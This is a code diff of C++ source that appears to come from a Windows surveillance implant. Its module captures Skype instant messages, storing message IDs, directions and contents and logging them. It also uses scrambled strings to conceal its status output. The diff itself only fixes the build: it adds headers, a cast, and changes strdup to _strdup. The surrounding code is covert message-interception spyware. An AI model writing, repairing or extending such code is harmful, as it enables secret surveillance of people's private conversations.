@@ -1,4 +1,20 @@
-#include "IMAgent/QMessengerAgent.h"
+#define _CRT_SECURE_NO_WARNINGS 1
+#include <windows.h>
+#include <json/json.h>
+#include <time.h>
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/AM_Core.h"
+#include "../../H4DLL/bin_string.h"
+#include "../../H4DLL/H4-DLL.h"
+#include "../../H4DLL/demo_functions.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/HM_IpcModule.h"
+#include "../../H4DLL/process.h"
+#include "../../H4DLL/LOG.h"
+#include <scramblestring.h>
+#include "../../H4DLL/HM_SkypeRecord.h"
+
+#include "QMessengerAgent.h"
 
 extern WCHAR *UTF8_2_UTF16(char *str); // in firefox.cpp
 extern void StartSocialCapture(); // Per far partire le opzioni "social"
@@ -230,7 +246,7 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 		return 1;
 	}
 	if (dwFlags == FLAGS_SKAPI_WND) {
-		ScrambleString ss("_ OEPUvEtUPC yO Hdldl1.............QM\r\n", shared.is_demo_version); // "- Monitoring IM queues.............OK\r\n"
+		ScrambleString ss((char*)"_ OEPUvEtUPC yO Hdldl1.............QM\r\n", shared.is_demo_version); // "- Monitoring IM queues.............OK\r\n"
 		REPORT_STATUS_LOG(ss.get_str());
 		skype_api_wnd = *((HWND *)msg);
 		return 1;
@@ -276,7 +292,7 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 			// Cerchiamo un posto libero nell'array 
 			for (i=0; i<SKYPE_MESSAGE_BACKLOG; i++) {
 				if (!im_skype_message_list[i].in_use) {
-					if ( im_skype_message_list[i].message_id = strdup(message_id) ) {
+					if ( im_skype_message_list[i].message_id = _strdup(message_id) ) {
 						im_skype_message_list[i].direction = direction;
 						im_skype_message_list[i].in_use = TRUE;
 						break;
@@ -341,7 +357,7 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 						break;
 
 					// Ci aggiunge il dato
-					if (data && ((*prop_to_write) = strdup(data))) {
+					if (data && ((*prop_to_write) = _strdup(data))) {
 						// Se con questo completa la entry, la logga e la libera
 						if (CheckCompleteEntry(&im_skype_message_list[i])) {
 							SkypeLogMessageEntry(&im_skype_message_list[i]);
